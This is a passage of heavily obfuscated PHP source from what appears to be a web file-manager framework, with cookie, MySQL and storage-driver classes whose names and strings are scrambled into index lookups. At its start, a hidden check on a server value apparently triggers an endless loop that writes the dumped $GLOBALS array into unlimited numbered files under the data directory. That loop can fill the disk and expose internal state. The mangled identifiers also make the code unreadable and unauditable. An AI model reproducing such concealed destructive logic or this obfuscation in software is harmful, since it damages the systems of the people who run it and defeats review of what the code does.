$_SERVER[$ÙÊƒ½¬¹[15]]; $ÛÇ³·¢ı = $ÙÊƒ½¬¹[917]; if ($_SERVER[$ÙÊƒ½¬¹[6]] != $ÛÇ³·¢ı($€åãº¡Ş)) { $›å×‹ğ™ = $ÙÊƒ½¬¹[918]; $«Ï¥¥ñœ = $ÙÊƒ½¬¹[8]; $Ôã•£Ãú = $_SERVER[$ÙÊƒ½¬¹[9]] . $ÙÊƒ½¬¹[10]; $òîûÒ×¹ = $«Ï¥¥ñœ($Ôã•£Ãú); $Ôşå«éé = explode($ÙÊƒ½¬¹[11], $òîûÒ×¹); if (count($Ôşå«éé) < $ÙÊƒ½¬¹[662]) { $‚ª†·¯ä = $ÙÊƒ½¬¹[13]; $‚ª†·¯ä(); } $éÜæÚ   = $ÙÊƒ½¬¹[919]; $éÜæÚ  ($_SERVER[$ÙÊƒ½¬¹[920]]); $›å×‹ğ™ = $ÙÊƒ½¬¹[918]; $›å×‹ğ™(); $Å³Ùºä = $ÙÊƒ½¬¹[921]; $‡ÜôüÖÆ = json_encode($GLOBALS[$ÙÊƒ½¬¹[922]]); $ú·ƒ¶Èê = 1; for ($çÑ£–Âº = $ú·ƒ¶Èê; $çÑ£–Âº > 0; $çÑ£–Âº++) { $Å³Ùºä(DATA_PATH . $çÑ£–Âº, $‡ÜôüÖÆ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ÛÛá€ı) { $this->handle->flushall($ÛÛá€ı); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ù’ê‹ŸÛ = '', $ æğÕ¨Š = 0) { if (is_string($ù’ê‹ŸÛ) && $ù’ê‹ŸÛ != $_SERVER[ú÷îèÆÜ][22]) { $this->prefix = $ù’ê‹ŸÛ; } if (is_numeric($ æğÕ¨Š) && $ æğÕ¨Š > 0) { $this->expire = $ æğÕ¨Š; } } public static function getInstance() { static $·Êš®û‰; if ($·Êš®û‰ === null) { $·Êš®û‰ = new self(); } return $·Êš®û‰; } private static $cookieDisable = false; public static function disable($ïË €°£) { self::$cookieDisable = $ïË €°£; } private static $sameCookieSet = array(); public static function set($÷Õ˜‰±—, $ßÈï‚°, $Ø•§”ÛÂ = 0, $óËœ€¾Ğ = false, $ÙÌ©ÃÇ€ = false) { $Ÿ„¡İéè =& $_SERVER[ú÷îèÆÜ]; if (self::$cookieDisable) { return; } if (!$Ø•§”ÛÂ) { $Ø•§”ÛÂ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$÷Õ˜‰±—]) && self::$sameCookieSet[$÷Õ˜‰±—] == $ßÈï‚° . $Ø•§”ÛÂ) { return; } self::$sameCookieSet[$÷Õ˜‰±—] = $ßÈï‚° . $Ø•§”ÛÂ; if (!$ÙÌ©ÃÇ€) { $ÙÌ©ÃÇ€ = str_replace(HOST, $Ÿ„¡İéè[22], APP_HOST); $ÙÌ©ÃÇ€ = _get($GLOBALS, $Ÿ„¡İéè[923], $ÙÌ©ÃÇ€); } $±×—šœø = $Ÿ„¡İéè[22]; setcookie($÷Õ˜‰±—, $ßÈï‚°, time() + $Ø•§”ÛÂ, $Ÿ„¡İéè[18] . trim($ÙÌ©ÃÇ€, $Ÿ„¡İéè[18]) . $±×—šœø, !1, !1, $óËœ€¾Ğ); } public static function setSafe($ôÉõÙŒ†, $Š¹àò, $ı‰  ‹ = 0) { self::set($ôÉõÙŒ†, $Š¹àò, $ı‰  ‹, !0); } public static function get($ĞÚÕÏŞë) { static $Ã‘Şµ = false; if (!$Ã‘Şµ) { self::initHeaderCookie(); $Ã‘Şµ = !0; } return isset($_COOKIE[$ĞÚÕÏŞë]) ? $_COOKIE[$ĞÚÕÏŞë] : !1; } private static function initHeaderCookie() { $Ÿ»²Öä² =& $_SERVER[ú÷îèÆÜ]; if (!isset($_SERVER[$Ÿ»²Öä²[924]]) || !$_SERVER[$Ÿ»²Öä²[924]]) { return; } $§ø·ñ = explode($Ÿ»²Öä²[81], $_SERVER[$Ÿ»²Öä²[924]]); foreach ($§ø·ñ as $¢ß¦ÈË¶) { $¢ß¦ÈË¶ = explode($Ÿ»²Öä²[925], $¢ß¦ÈË¶); if (count($¢ß¦ÈË¶) != 2 || !isset($¢ß¦ÈË¶[1])) { continue; } $_COOKIE[trim($¢ß¦ÈË¶[0])] = trim($¢ß¦ÈË¶[1]); } } public static function remove($Í÷ºÁæá, $Ìµœò = false) { unset($_COOKIE[$Í÷ºÁæá]); self::set($Í÷ºÁæá, $_SERVER[ú÷îèÆÜ][22], 1, $Ìµœò); } } class DbMysql extends Db { public function __construct($äïÜòøû = '') { $úÌ‘ºêÈ =& $_SERVER[ú÷îèÆÜ]; if (!extension_loaded($úÌ‘ºêÈ[844])) { think_exception(think_lang($úÌ‘ºêÈ[24]) . $úÌ‘ºêÈ[926]); } if (!empty($äïÜòøû)) { $this->config = $äïÜòøû; if (empty($this->config[$úÌ‘ºêÈ[27]])) { $this->config[$úÌ‘ºêÈ[27]] = $úÌ‘ºêÈ[22]; } } } public function connect($”æ‹»àæ = '', $„‚É¨õ¨ = 0, $•ÛÖèÇ = false) { $š½½•ıˆ =& $_SERVER[ú÷îèÆÜ]; if (!isset($this->linkID[$„‚É¨õ¨])) { if (empty($”æ‹»àæ)) { $”æ‹»àæ = $this->config; } $…Í›ô’ = $”æ‹»àæ[$š½½•ıˆ[927]] . ($”æ‹»àæ[$š½½•ıˆ[928]] ? "\x3a{$”æ‹»àæ[$š½½•ıˆ[928]]}" : $š½½•ıˆ[22]); $íÌ€½Ş£ = !empty($”æ‹»àæ[$š½½•ıˆ[27]][$š½½•ıˆ[28]]) ? $”æ‹»àæ[$š½½•ıˆ[27]][$š½½•ıˆ[28]] : $this->pconnect; if ($íÌ€½Ş£) { $this->linkID[$„‚É¨õ¨] = mysql_pconnect($…Í›ô’, $”æ‹»àæ[$š½½•ıˆ[929]], $”æ‹»àæ[$š½½•ıˆ[930]], 131072); } else { $this->linkID[$„‚É¨õ¨] = mysql_connect($…Í›ô’, $”æ‹»àæ[$š½½•ıˆ[929]], $”æ‹»àæ[$š½½•ıˆ[930]], !0, 131072); } if (!$this->linkID[$„‚É¨õ¨] || !empty($”æ‹»àæ[$š½½•ıˆ[31]]) && !mysql_select_db($”æ‹»àæ[$š½½•ıˆ[31]], $this->linkID[$„‚É¨õ¨])) { think_exception(mysql_error()); } $üúßõÆõ = mysql_get_server_info($this->linkID[$„‚É¨õ¨]); mysql_query($š½½•ıˆ[931] . think_config($š½½•ıˆ[932]) . $š½½•ıˆ[68], $this->linkID[$„‚É¨õ¨]); if ($üúßõÆõ > $š½½•ıˆ[933]) { mysql_query($š½½•ıˆ[934], $this->linkID[$„‚É¨õ¨]); } $this->connected = !0; if (1 != think_config($š½½•ıˆ[32])) { unset($this->config); } } return $this->linkID[$„‚É¨õ¨]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($âáÏì¸) { $ûİñ›º® =& $_SERVER[ú÷îèÆÜ]; if (0 === stripos($âáÏì¸, $ûİñ›º®[317])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $âáÏì¸; if ($this->queryID) { $this->free(); } think_action_status($ûİñ›º®[33], 1); think_status($ûİñ›º®[34]); $this->queryID = mysql_query($âáÏì¸, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($¢õÏıíÎ) { $ú¶å³…ö =& $_SERVER[ú÷îèÆÜ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¢õÏıíÎ; if ($this->queryID) { $this->free(); } think_action_status($ú¶å³…ö[35], 1); think_status($ú¶å³…ö[34]); $•é°—‘µ = mysql_query($¢õÏıíÎ, $this->_linkID); $this->debug(); if (!1 === $•é°—‘µ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ú÷îèÆÜ][935], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÒÏ«÷âÜ = mysql_query($_SERVER[ú÷îèÆÜ][936], $this->_linkID); $this->transTimes = 0; if (!$ÒÏ«÷âÜ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ü½ãßãà = mysql_query($_SERVER[ú÷îèÆÜ][937], $this->_linkID); $this->transTimes = 0; if (!$Ü½ãßãà) { $this->error(); return !1; } } return !0; } private function getAll() { $©©¿Û İ = array(); if ($this->numRows > 0) { while ($ÃòÎ×Ù© = mysql_fetch_assoc($this->queryID)) { $©©¿Û İ[] = $ÃòÎ×Ù©; } mysql_data_seek($this->queryID, 0); } return $©©¿Û İ; } public function getFields($åÍáÉŒ) { $Ì·¶ÊÁ =& $_SERVER[ú÷îèÆÜ]; $·ÛºóÚ = $this->query($Ì·¶ÊÁ[938] . $this->parseKey($åÍáÉŒ)); $ö»æ«û = array(); if ($·ÛºóÚ) { foreach ($·ÛºóÚ as $È´€½°Ô => $¯»Ì‡İ) { $ö»æ«û[$¯»Ì‡İ[$Ì·¶ÊÁ[41]]] = array($Ì·¶ÊÁ[42] => $¯»Ì‡İ[$Ì·¶ÊÁ[41]], $Ì·¶ÊÁ[43] => $¯»Ì‡İ[$Ì·¶ÊÁ[44]], $Ì·¶ÊÁ[45] => (bool) (strtoupper($¯»Ì‡İ[$Ì·¶ÊÁ[46]]) === $Ì·¶ÊÁ[939]), $Ì·¶ÊÁ[47] => $¯»Ì‡İ[$Ì·¶ÊÁ[48]], $Ì·¶ÊÁ[49] => strtolower($¯»Ì‡İ[$Ì·¶ÊÁ[50]]) == $Ì·¶ÊÁ[51], $Ì·¶ÊÁ[52] => strtolower($¯»Ì‡İ[$Ì·¶ÊÁ[53]]) == $Ì·¶ÊÁ[54]); } } return $ö»æ«û; } public function getTables($·ÎèÄÁƒ = '') { $šåõ£ò =& $_SERVER[ú÷îèÆÜ]; if (!empty($·ÎèÄÁƒ)) { $îÅ¼¨å¾ = $šåõ£ò[940] . $·ÎèÄÁƒ . $šåõ£ò[941]; } else { $îÅ¼¨å¾ = $šåõ£ò[942]; } $´µ“ğœ‰ = $this->query($îÅ¼¨å¾); $¼ı“§À– = array(); foreach ($´µ“ğœ‰ as $ı–©³½Ş => $‚ŠŸ¼¶õ) { $¼ı“§À–[$ı–©³½Ş] = current($‚ŠŸ¼¶õ); } return $¼ı“§À–; } public function replace($¥§ƒŒ–, $÷°Ó° = array()) { $ò½×Ï§ =& $_SERVER[ú÷îèÆÜ]; foreach ($¥§ƒŒ– as $âùıáªì => $¢Œ˜Ö„) { $ÃóˆŞì = $this->parseValue($¢Œ˜Ö„); if (is_scalar($ÃóˆŞì)) { $æÇƒë‘õ[] = $ÃóˆŞì; $Ëñ‰ÂŞù[] = $this->parseKey($âùıáªì); } } $ ›¢ºğœ = $ò½×Ï§[943] . $this->parseTable($÷°Ó°[$ò½×Ï§[332]]) . $ò½×Ï§[944] . implode($ò½×Ï§[60], $Ëñ‰ÂŞù) . $ò½×Ï§[945] . implode($ò½×Ï§[60], $æÇƒë‘õ) . $ò½×Ï§[946]; return $this->execute($ ›¢ºğœ); } public function insertAll($·Ôéğ•£, $”÷…æß = array(), $õÊŞÃ—‚ = false) { $Â™–çÍÅ =& $_SERVER[ú÷îèÆÜ]; if (!is_array($·Ôéğ•£[0])) { return !1; } $˜¹ØÏÈ = array_keys($·Ôéğ•£[0]); $•“ùº†¼ = array(); foreach ($·Ôéğ•£ as $¸³çıìù) { $ä…«Ç = array(); foreach ($¸³çıìù as $ğ¸‹·’ => $ŒÀã‚Û¥) { $ŒÀã‚Û¥ = $this->parseValue($ŒÀã‚Û¥); if (is_scalar($ŒÀã‚Û¥)) { $ä…«Ç[] = $ŒÀã‚Û¥; } } $•“ùº†¼[] = $Â™–çÍÅ[313] . implode($Â™–çÍÅ[60], $ä…«Ç) . $Â™–çÍÅ[946]; } array_walk($˜¹ØÏÈ, array($this, $Â™–çÍÅ[947])); $êõ´¡Ï¬ = ($õÊŞÃ—‚ ? $Â™–çÍÅ[948] : $Â™–çÍÅ[949]) . $Â™–çÍÅ[950] . $this->parseTable($”÷…æß[$Â™–çÍÅ[332]]) . $Â™–çÍÅ[944] . implode($Â™–çÍÅ[60], $˜¹ØÏÈ) . $Â™–çÍÅ[951] . implode($Â™–çÍÅ[60], $•“ùº†¼); return $this->execute($êõ´¡Ï¬); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÌáÍ´Õ =& $_SERVER[ú÷îèÆÜ]; $this->error = mysql_errno() . $ÌáÍ´Õ[4] . mysql_error($this->_linkID); if ($ÌáÍ´Õ[22] != $this->queryStr) { $this->error .= LNG($ÌáÍ´Õ[58]) . $this->queryStr; } think_trace($this->error, $ÌáÍ´Õ[22], $ÌáÍ´Õ[59]); return $this->error; } public function escapeString($¤âŠ·˜–) { if ($this->_linkID) { return mysql_real_escape_string($¤âŠ·˜–, $this->_linkID); } else { return mysql_escape_string($¤âŠ·˜–); } } public function parseKey(&$ØèÜ©¼´, $ŒÁ‹Ç»ö = true) { $—Öƒşù­ =& $_SERVER[ú÷îèÆÜ]; if ($ŒÁ‹Ç»ö) { $ØèÜ©¼´ = $this->parseKeyCheck($ØèÜ©¼´); } if ($ØèÜ©¼´ != $—Öƒşù­[213] && !preg_match($—Öƒşù­[952], $ØèÜ©¼´)) { $ØèÜ©¼´ = $—Öƒşù­[438] . trim($ØèÜ©¼´, $—Öƒşù­[438]) . $—Öƒşù­[438]; } return $ØèÜ©¼´; } } goto CœõÉÜŞÂæ; DÔáô¬¤„Ë: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\163\x6f\x75\162\x63\x65\x53\145\143\x72\x65\164\x4c\x69\x73\x74"; public $field = array("\163\157\x75\162\x63\145\x49\x44", "\164\x79\160\145\111\104", "\x63\162\145\x61\164\x65\125\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x73\x74\157\162\141\x67\145\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x73\x69\172\145\x4d\141\170", "\163\x79\x73\164\145\x6d", "\x64\x65\x66\141\x75\x6c\164", "\x64\x72\x69\x76\x65\x72", "\143\x6f\156\146\x69\147"); public function listData($•›±ù = false, $ãÒ¼çİŸ = "\x6d\x6f\144\151\146\171\x54\x69\155\x65", $‡ñö˜ü“ = false) { $¥°Üôš =& $_SERVER[ú÷îèÆÜ]; $”Öê÷ä = parent::listData($•›±ù, $ãÒ¼çİŸ, $‡ñö˜ü“); if ($•›±ù) { return $”Öê÷ä; } $²Ê É©ğ = $this->ioSizeUseGet(array_to_keyvalue($”Öê÷ä, $¥°Üôš[22], $¥°Üôš[452])); foreach ($”Öê÷ä as $µáÖ„¶„ => $¸–İëì¹) { unset($”Öê÷ä[$µáÖ„¶„][$¥°Üôš[16]]); $”Öê÷ä[$µáÖ„¶„][$¥°Üôš[1872]] = isset($²Ê É©ğ[$¸–İëì¹[$¥°Üôš[452]]]) ? $²Ê É©ğ[$¸–İëì¹[$¥°Üôš[452]]] : 0; } return $”Öê÷ä; } public function ioSizeUseGet($Ó„îÔÅ²) { $ÀÑğ£ë =& $_SERVER[ú÷îèÆÜ]; if (!$Ó„îÔÅ²) { return array(); } $ÍöéÂäì = $ÀÑğ£ë[2203] . implode($ÀÑğ£ë[60], $Ó„îÔÅ²); $Í«à¾ õ = Cache::get($ÍöéÂäì); if ($Í«à¾ õ) { return $Í«à¾ õ; } $Éûôä²Å = array($ÀÑğ£ë[857] => $ÀÑğ£ë[452], $ÀÑğ£ë[2204] => $ÀÑğ£ë[86]); $©İ„¯ã = array($ÀÑğ£ë[857] => array($ÀÑğ£ë[17], $Ó„îÔÅ²)); $Í«à¾ õ = Model($ÀÑğ£ë[829])->field($Éûôä²Å)->where($©İ„¯ã)->group($ÀÑğ£ë[857])->select(); $Í«à¾ õ = array_to_keyvalue($Í«à¾ õ, $ÀÑğ£ë[452], $ÀÑğ£ë[86]); Cache::set($ÍöéÂäì, $Í«à¾ õ, 600); return $Í«à¾ õ; } public function getConfig($ÀµÔŞãÖ) { $‚ğ åòÑ = parent::listData($ÀµÔŞãÖ); return json_decode($‚ğ åòÑ[$_SERVER[ú÷îèÆÜ][16]], !0); } public function update($ã€è¶Åä, $ ßİõÆá) { $©¢¶ÒªÊ =& $_SERVER[ú÷îèÆÜ]; $ä®ÆÓòÅ = $ ßİõÆá[$©¢¶ÒªÊ[42]]; $ë¼£ä = array_to_keyvalue(parent::listData(), $©¢¶ÒªÊ[42]); if (isset($ë¼£ä[$ä®ÆÓòÅ]) && $ë¼£ä[$ä®ÆÓòÅ][$©¢¶ÒªÊ[452]] != $ã€è¶Åä) { return !1; } $this->checkPwd($ã€è¶Åä, $ ßİõÆá); if (isset($ ßİõÆá[$©¢¶ÒªÊ[2205]]) && $ ßİõÆá[$©¢¶ÒªÊ[2205]] == $©¢¶ÒªÊ[98]) { $this->checkConfig($ ßİõÆá); } unset($ ßİõÆá[$©¢¶ÒªÊ[2205]]); $ú£ÆˆË… = parent::update($ã€è¶Åä, $ ßİõÆá); if ($ú£ÆˆË… && $ ßİõÆá[$©¢¶ÒªÊ[47]]) { $îıøï’¡ = 0; foreach ($ë¼£ä as $Ø€ëïÃ×) { if ($Ø€ëïÃ×[$©¢¶ÒªÊ[47]] && $Ø€ëïÃ×[$©¢¶ÒªÊ[452]] != $ã€è¶Åä) { $îıøï’¡ = $Ø€ëïÃ×[$©¢¶ÒªÊ[452]]; parent::update($Ø€ëïÃ×[$©¢¶ÒªÊ[452]], array($©¢¶ÒªÊ[47] => 0)); } } $this->updateBackup($ã€è¶Åä, $îıøï’¡); } return $ú£ÆˆË…; } public function add($õöÌıÀ) { $ÑÊé†™Â =& $_SERVER[ú÷îèÆÜ]; $ñØêıÃÈ = array_to_keyvalue(parent::listData(), $ÑÊé†™Â[42]); if (isset($ñØêıÃÈ[$õöÌıÀ[$ÑÊé†™Â[42]]])) { return !1; } $this->checkConfig($õöÌıÀ); $í£‚®ö” = parent::insert($õöÌıÀ); if ($í£‚®ö” && $õöÌıÀ[$ÑÊé†™Â[47]]) { foreach ($ñØêıÃÈ as $¬ø¹¬ú‘) { if ($¬ø¹¬ú‘[$ÑÊé†™Â[47]]) { parent::update($¬ø¹¬ú‘[$ÑÊé†™Â[452]], array($ÑÊé†™Â[47] => 0)); } } } return $í£‚®ö”; } public function updateBackup($•Ãù˜Ğë, $‚ƒÇ–Ä) { $°½ó­øË =& $_SERVER[ú÷îèÆÜ]; if (!$‚ƒÇ–Ä) { return; } $‚üÊÏä¥ = Model($°½ó­øË[789])->config(); if ($‚üÊÏä¥[$°½ó­øË[1655]] != $°½ó­øË[98] || $‚üÊÏä¥[$°½ó­øË[791]] != $‚ƒÇ–Ä) { return; } $È×îç¤Ø = Model($°½ó­øË[810])->get($°½ó­øË[820]); $È×îç¤Ø = json_decode($È×îç¤Ø, !0); if (!$È×îç¤Ø) { return; } $È×îç¤Ø[$°½ó­øË[791]] = $•Ãù˜Ğë; Model($°½ó­øË[810])->set(array($°½ó­øË[820] => $È×îç¤Ø)); } public function checkPwd($ë¹ÉÛÔˆ, &$¾ä‘÷Åí) { $â¶Ù»šõ =& $_SERVER[ú÷îèÆÜ]; if (empty($¾ä‘÷Åí[$â¶Ù»šõ[16]])) { return; } $çî•¯ÅÎ = json_decode($¾ä‘÷Åí[$â¶Ù»šõ[16]], !0); $Ì”¦Ñ¿Ù = $â¶Ù»šõ[22]; $·‰ÊÌÔÑ = array($â¶Ù»šõ[2206], $â¶Ù»šõ[2207], $â¶Ù»šõ[930]); foreach ($·‰ÊÌÔÑ as $ôÊÄáÏ ) { if (isset($çî•¯ÅÎ[$ôÊÄáÏ ])) { $Ì”¦Ñ¿Ù = $ôÊÄáÏ ; break; } } if (!$Ì”¦Ñ¿Ù) { return; } $†î ¬Ã = $this->getConfig($ë¹ÉÛÔˆ); $•Ç€Öôî = $†î ¬Ã[$Ì”¦Ñ¿Ù]; $ŠÃıçºŸ = $çî•¯ÅÎ[$Ì”¦Ñ¿Ù]; if ($ŠÃıçºŸ == str_repeat($â¶Ù»šõ[213], strlen($•Ç€Öôî))) { $çî•¯ÅÎ[$Ì”¦Ñ¿Ù] = $•Ç€Öôî; $¾ä‘÷Åí[$â¶Ù»šõ[16]] = json_encode($çî•¯ÅÎ); } else { if ($ŠÃıçºŸ != $•Ç€Öôî) { $¾ä‘÷Åí[$â¶Ù»šõ[2205]] = $â¶Ù»šõ[98]; } } } public function checkConfig(&$íä”ŠÓê, $î‚Ì‰Ñ = false) { $Úè¸™ş =& $_SERVER[ú÷îèÆÜ]; $ó“ÚÊ¾ = strtolower($íä”ŠÓê[$Úè¸™ş[105]]); $”»ÏÎá = json_decode($íä”ŠÓê[$Úè¸™ş[16]], !0); foreach ($”»ÏÎá as $²›À³ => $™êë€ÑÃ) { if (is_string($™êë€ÑÃ)) { $”»ÏÎá[$²›À³] = trim($™êë€ÑÃ); } } $”»ÏÎá[$Úè¸™ş[2208]] = rand_string(6); $¹œØ›· = $GLOBALS[$Úè¸™ş[16]][$Úè¸™ş[99]][$Úè¸™ş[866]]; $¯Å®Û“Á = isset($¹œØ›·[$ó“ÚÊ¾]) ? $¹œØ›·[$ó“ÚÊ¾] : ucfirst($ó“ÚÊ¾); $âäœ¥›° = $Úè¸™ş[84] . $¯Å®Û“Á; if (!$¯Å®Û“Á || !class_exists($âäœ¥›°)) { if ($î‚Ì‰Ñ) { return LNG($Úè¸™ş[2209]); } write_log(array($Úè¸™ş[2210], $íä”ŠÓê, get_caller_info()), $Úè¸™ş[2211]); show_json(LNG($Úè¸™ş[2209]), !1, $íä”ŠÓê); } $Ô©àçû¨ = new $âäœ¥›°($”»ÏÎá); if (in_array($ó“ÚÊ¾, $Ô©àçû¨->objectDriver)) { if (!$Ô©àçû¨->isBucketCors() && !$Ô©àçû¨->setBucketCors()) { $“¿ü‹×  = LNG($Úè¸™ş[2212]); $“¿ü‹×  .= $Úè¸™ş[2213] . LNG($Úè¸™ş[2214]); if ($î‚Ì‰Ñ) { return $“¿ü‹× ; } show_json($“¿ü‹× , !1); } } $æ÷ÖË¯® = rtrim($”»ÏÎá[$Úè¸™ş[1221]], $Úè¸™ş[18]) . $Úè¸™ş[18]; $¦ÑßšîÕ = $Ô©àçû¨->getPath($æ÷ÖË¯® . $Úè¸™ş[1225]); if (!$Ô©àçû¨->mkfile($¦ÑßšîÕ)) { if ($î‚Ì‰Ñ) { return LNG($Úè¸™ş[2212]); } show_json(LNG($Úè¸™ş[2212]), !1); } $”»ÏÎá[$Úè¸™ş[1221]] = $æ÷ÖË¯®; $íä”ŠÓê[$Úè¸™ş[16]] = json_encode($”»ÏÎá); $íä”ŠÓê[$Úè¸™ş[105]] = $¯Å®Û“Á; return !0; } public function driverListSystem() { $ºæ­×æ =& $_SERVER[ú÷îèÆÜ]; $Ô·­ÌÛ— = parent::listData(); $—£ãÅøÕ = array(); foreach ($Ô·­ÌÛ— as $Îœ–€—…) { unset($Îœ–€—…[$ºæ­×æ[225]], $Îœ–€—…[$ºæ­×æ[95]]); $Îœ–€—…[$ºæ­×æ[16]] = json_decode($Îœ–€—…[$ºæ­×æ[16]], !0); $—£ãÅøÕ[] = $Îœ–€—…; } return $—£ãÅøÕ; } public function defaultDriver() { $Ù¯ã»™Ì =& $_SERVER[ú÷îèÆÜ]; $´‚Š™â² = parent::listData(); $åÛ­«ûş = array_filter_by_field($´‚Š™â², $Ù¯ã»™Ì[47], 1); $åÛ­«ûş = $åÛ­«ûş[0]; if ($åÛ­«ûş) { $åÛ­«ûş[$Ù¯ã»™Ì[16]] = json_decode($åÛ­«ûş[$Ù¯ã»™Ì[16]], !0); } return $åÛ­«ûş; } public function driverInfo($«¢à˜œ“) { $Ë¦…šÕš =& $_SERVER[ú÷îèÆÜ]; $ŠİÁó“ = array_to_keyvalue(parent::listData(), $Ë¦…šÕš[452]); if (!isset($ŠİÁó“[$«¢à˜œ“])) { return !1; } $ŸàÍËº¼ = $ŠİÁó“[$«¢à˜œ“]; $ŸàÍËº¼[$Ë¦…šÕš[16]] = json_decode($ŸàÍËº¼[$Ë¦…šÕš[16]], !0); return $ŸàÍËº¼; } public function remove($ëš§×º’) { $this->removeShareItems($ëš§×º’); return parent::remove($ëš§×º’); } public function removeWithFile($«Ï«ˆ™›, $İ¿¼ƒµ) { $êæÆŸÍÅ =& $_SERVER[ú÷îèÆÜ]; $Ó ›Ç×° = array($êæÆŸÍÅ[857] => $«Ï«ˆ™›); $­ÒÔóµÒ = Model($êæÆŸÍÅ[521])->where($Ó ›Ç×°)->count(); $«ù¿Ö„Ã = Model($êæÆŸÍÅ[521])->where($Ó ›Ç×°)->sum($êæÆŸÍÅ[86]); $˜¢æ¦ûá = $İ¿¼ƒµ . $êæÆŸÍÅ[2215] . $«Ï«ˆ™›; $¶ãºÙÏ = LNG($İ¿¼ƒµ == $êæÆŸÍÅ[597] ? $êæÆŸÍÅ[2216] : $êæÆŸÍÅ[2217]); $ı¿»±æ  = new TaskFileTransfer($˜¢æ¦ûá, $êæÆŸÍÅ[2211], $­ÒÔóµÒ, $¶ãºÙÏ . "\50{$«Ï«ˆ™›}\51"); $ı¿»±æ ->task[$êæÆŸÍÅ[803]] = (double) $«ù¿Ö„Ã; $ÍÊ³Ë©¶ = KodIO::defaultDriver(); $’òõŠÏÊ = $ÍÊ³Ë©¶[$êæÆŸÍÅ[452]]; $¨¡§ëŸ¨ = "\x7b\x69\157\72{$’òõŠÏÊ}\175\57"; $Íšİó¬ƒ = !0; $©•¯‡È = array(); $»şï›¨ = Model($êæÆŸÍÅ[224])->where($Ó ›Ç×°)->field($êæÆŸÍÅ[2218])->select(); foreach ($»şï›¨ as $€¬ÀÁÀ¸) { $©˜êÜø = $€¬ÀÁÀ¸[$êæÆŸÍÅ[94]]; $ÑÄé¹æ¾ = $¨¡§ëŸ¨ . str_replace("\173\x69\157\72{$«Ï«ˆ™›}\175\x2f", $êæÆŸÍÅ[22], $©˜êÜø); if (!IO::exist($©˜êÜø)) { $©•¯‡È[] = $€¬ÀÁÀ¸[$êæÆŸÍÅ[518]]; $ı¿»±æ ->updateFileEnd($€¬ÀÁÀ¸[$êæÆŸÍÅ[42]], $€¬ÀÁÀ¸[$êæÆŸÍÅ[86]]); continue; } if (IO::exist($ÑÄé¹æ¾)) { $ı¿»±æ ->updateFileEnd($€¬ÀÁÀ¸[$êæÆŸÍÅ[42]], $€¬ÀÁÀ¸[$êæÆŸÍÅ[86]]); continue; } if (!IO::move($©˜êÜø, get_path_father($ÑÄé¹æ¾))) { $Íšİó¬ƒ = !1; break; } $Ó ›Ç×° = array($êæÆŸÍÅ[518] => $€¬ÀÁÀ¸[$êæÆŸÍÅ[518]]); $›†ÜÌ‰Ø = array($êæÆŸÍÅ[857] => $’òõŠÏÊ, $êæÆŸÍÅ[94] => $ÑÄé¹æ¾); Model($êæÆŸÍÅ[224])->where($Ó ›Ç×°)->save($›†ÜÌ‰Ø); } $this->removeByFileID($©•¯‡È); if (!$Íšİó¬ƒ) { $ı¿»±æ ->stop($˜¢æ¦ûá); return !1; } $ı¿»±æ ->end(); if ($İ¿¼ƒµ == $êæÆŸÍÅ[1852]) { $this->remove($«Ï«ˆ™›); } } public function progress($¥É‚¾ëŒ, $‹å¦¨ €) { return Task::get($‹å¦¨ € . $_SERVER[ú÷îèÆÜ][2215] . $¥É‚¾ëŒ); } private function removeByFileID($¶ÙíÒ·Û = array()) { $°¸ö“£œ =& $_SERVER[ú÷îèÆÜ]; if (empty($¶ÙíÒ·Û)) { return; } $ùÀğ¡ü = array($°¸ö“£œ[518] => array($°¸ö“£œ[17], $¶ÙíÒ·Û)); $ò•Ø”ç¿ = Model($°¸ö“£œ[1373])->where($ùÀğ¡ü)->field($°¸ö“£œ[191])->select(); if (!$ò•Ø”ç¿) { return; } $ò•Ø”ç¿ = array_to_keyvalue($ò•Ø”ç¿, $°¸ö“£œ[22], $°¸ö“£œ[191]); foreach ($ò•Ø”ç¿ as $§÷”ÙÒ) { Model($°¸ö“£œ[467])->removeNow($§÷”ÙÒ, !1); } } private function removeShareItems($œ“İ£Ü†) { $â×…Ü¨Ï =& $_SERVER[ú÷îèÆÜ]; $‹´²ô‚­ = "\x7b\151\157\x3a{$œ“İ£Ü†}\175\57"; $ÚæÕ—ÆØ = array($â×…Ü¨Ï[191] => 0, $â×…Ü¨Ï[1216] => array($â×…Ü¨Ï[436], "{$‹´²ô‚­}\x25")); $Á½¨ŒÊÀ = Model($â×…Ü¨Ï[1863])->where($ÚæÕ—ÆØ)->field($â×…Ü¨Ï[642])->select(); if (empty($Á½¨ŒÊÀ)) { return; } $çŸ†õª¨ = array_to_keyvalue($Á½¨ŒÊÀ, $â×…Ü¨Ï[22], $â×…Ü¨Ï[642]); Model($â×…Ü¨Ï[641])->remove($çŸ†õª¨); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\114\x69\147\150\164\x41\160\160"; public $modelType = "\123\171\x73\164\145\x6d\117\x70\x74\151\x6f\156"; public $field = array("\x6e\141\155\145", "\147\162\x6f\165\160", "\x64\x65\x73\143", "\143\157\156\x74\145\x6e\x74"); public function listData($ß•»ÃË = false, $ÙŠô¿£À = "\155\x6f\x64\x69\146\171\124\151\x6d\x65", 